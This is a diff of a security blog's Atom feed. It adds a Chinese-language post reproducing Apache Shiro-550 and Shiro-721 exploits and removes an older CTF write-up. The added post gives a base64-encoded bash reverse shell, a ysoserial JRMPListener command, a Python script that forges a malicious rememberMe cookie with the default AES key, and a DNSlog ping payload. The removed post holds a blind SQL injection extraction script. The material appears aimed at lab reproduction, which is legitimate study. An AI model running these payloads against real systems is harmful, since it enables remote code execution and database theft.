@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2022-03-12T17:28:24.082Z</updated>
+  <updated>2022-03-15T12:30:46.449Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>shiro漏洞复现</title>
+    <link href="https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+    <published>2022-03-15T09:11:24.000Z</published>
+    <updated>2022-03-15T12:30:46.449Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h1><p><strong>影响版本:Apache Shiro &lt; 1.2.4</strong></p><p><strong>漏洞原理：</strong>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p><strong>特征判断</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><p><strong>环境搭建</strong></p><pre><code class="text">获取docker镜像docker pull medicean/vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>工具准备</strong></p><p>maven配置:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3在/etc/profile末尾添加maven环境变量:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>下载ysoserial并打包:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>生成的工具在ysoserial/target文件中。</p><p><strong>复现流程</strong></p><p><strong>1、检查是否存在默认的key</strong></p><p>推荐使用Shiro_exploit检测:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>如图成功获取密钥</p><p><strong>2、nc监听本地端口</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3、编写反弹shell代码</strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#进行base64编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4、通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5、使用shiro.py生成payload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:注意shiro.py要在target目录下</p><p><strong>6、构造数据包，伪造cookie，发送Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>用上文产生的payload进行替换</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>发送</p><p><strong>7、成功反弹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721）"></a>Shiro Padding Oracle Attack（Shiro-721）</h1><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>影响版本：Apache Shiro &lt; 1.4.2版本。</p><p><strong>漏洞利用：</strong><br>1、登录Shiro网站，从cookie中获得rememberMe字段的值。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2、利用DNSlog探测，通过ysoserial工具payload。</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>爆破成功，输出Result：</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4、使用构造的rememberMe攻击字符串重新请求网站<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5、成功触发Payload，在DNSLog获取到目标IP。<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="一键自动化漏洞利用工具"><a href="#一键自动化漏洞利用工具" class="headerlink" title="一键自动化漏洞利用工具"></a>一键自动化漏洞利用工具</h1><p>ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。<br>Github项目地址：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>参考链接:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮</summary>
+      
+    
+    
+    
+    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="shrio" scheme="https://sakurahack-y.github.io/tags/shrio/"/>
+    
+  </entry>
   
   <entry>
     <title>windows提权总结</title>
@@ -520,33 +546,6 @@
     
     
     <category term="伪随机数" scheme="https://sakurahack-y.github.io/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
-    <link href="https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
-    <id>https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</id>
-    <published>2021-10-22T06:50:41.000Z</published>
-    <updated>2021-10-22T06:55:50.285Z</updated>
-    
-    <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;进去只有一个简单得输入框，测试下是否存在sql注入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
-    
-    
-    <category term="SQL" scheme="https://sakurahack-y.github.io/tags/SQL/"/>
     
   </entry>
   
